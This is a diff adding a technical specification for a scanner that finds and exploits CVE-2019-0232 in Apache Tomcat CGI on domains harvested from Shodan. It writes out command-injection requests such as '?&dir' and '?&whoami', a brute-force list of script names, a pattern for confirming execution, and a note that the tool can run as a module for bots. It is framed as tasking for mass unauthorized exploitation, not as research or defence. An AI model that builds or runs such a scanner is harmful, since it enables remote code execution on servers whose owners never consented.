@@ -1,0 +1,108 @@
+APACHE TOMCAT/CGI-BIN VULNERABILITY SCANNER (CVE-2019-0232)
+TECHNICAL TASK
+
+
+GOAL
+
+It is necessary to develop a domain scanner with the CVE-2019-0232 vulnerability.
+
+
+EXPLOIT
+
+The essence of the exploit is incorrect escaping of the command line of the cgi-bin script of the Apache Tomcat server.
+Because of this, remote code execution is possible.
+If you give a request like
+
+http://localhost/cgi-bin/hello.bat?&whoami
+
+then cmd.exe /c "whoami" will be executed as a result
+
+Details are described in the links:
+https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat/
+https://wwws.nightwatchcybersecurity.com/2019/04/30/remote-code-execution-rce-in-cgi-servlet-apache-tomcat-on-windows-cve-2019-0232/
+
+
+IMPLEMENTATION
+
+We will use the service https://www.shodan.io/search?query=apache+tomcat as a scanning source
+You need an account to access shodan.io. But in theory it is safe even when implemented as a module for a bot.
+You can pre-download the necessary data in .csv format and upload them separately to bots through configs.
+
+The result of the scan is a list of records with fields:
+- URL of the original request (http://domain.com/cgi-bin/script.bat?&dir for example)
+- the full HTTP response to the request, including all HTTP headers and the response body
+- Whoami request URL (http://domain.com/cgi-bin/script.bat?&whoami)
+- full HTTP response to the whoami request (see below), including all HTTP headers and response body
+
+The scanning algorithm is as follows:
+1. parse shodan.io's response to this request, taking into account the paging. We get the site names from the response.
+OR we work on a .csv or .json file exported from the service (this is a paid service on the service).
+2. take the next domain from the output of the scanner.
+3. if there is a version of the server software in the headers, make sure that it is less than 7.0.94, 8.5.40 and 9.0.19, respectively.
+If the version is greater than or equal, skip the domain and move on to the next one.
+If the version is smaller or missing, continue.
+4. make requests
+
+http://domain.com/cgi-bin/hello.bat?&dir
+http://domain.com/cgi-bin/hello.bat?&dir
+http://domain.com/cgi-bin/test.bat?&dir
+http://domain.com/cgi-bin/info.bat?&dir
+http://domain.com/cgi-bin/0.bat?&dir
+http://domain.com/cgi-bin/1.bat?&dir
+
+We continue the enumeration, either until we sort through all the options for scripts, or until we get the answer we need.
+As you can see, the file names vary - it is better to put these names into an array in the program, and work through iteration.
+
+Sample script names:
+
+ hello.bat
+ helloworld.bat
+ test.bat
+ index.bat
+ info.bat
+ sysinfo.bat
+ run.bat
+ tomcat.bat
+ 0.bat
+ 1.bat
+ 2.bat
+ ...
+ 10.bat
+
+In addition, for each script name, you need to add numbers from 0 to 9 to its name.
+That is, for the name hello.bat we will try the following options:
+hello.bat
+hello0.bat
+hello1.bat
+..
+hello9.bat
+
+IMPORTANT: see why the metasploit works without selecting the script name!
+https://www.exploit-db.com/exploits/47073
+ANSWER: because there the name of the script is set from the outside, i.e. we don't really know the script.
+
+4. If a 200 code was received in response, the response should be analyzed for vulnerabilities:
+- for the dir command, there are always stable patterns in the response
+mm.dd.YYYY HH:mm <DIR> .
+mm.dd.YYYY HH:mm <DIR> ..
+
+If this pattern is present in the response:
+- make a request http://domain.com/cgi-bin/<script>.bat?&whoami
+(here script is the name of the script for which we managed to get a 200 response with the desired pattern)
+- add requests and responses to the resulting list.
+
+
+The scanner must be designed as follows:
+* this can be a script in a common scripting language (like python or PowerShell)
+* the script must log in the current directory, named $(script).log, where $(script) is the name of the actual script
+* the log must have date-time stamps for each event
+* logging can be basic and advanced - switchable by command line option
+* The following events should be added to the log:
+- start the program, with its version
+- detection of a domain with a vulnerability:
+  - domain
+  - software version
+  - complete HTTP requests and responses
+every N minutes (as an option - search iterations) display statistics:
+- % of domains scanned, % of vulnerable domains found
+- with extended logging, you need to log every HTTP request and response (even if they fail).
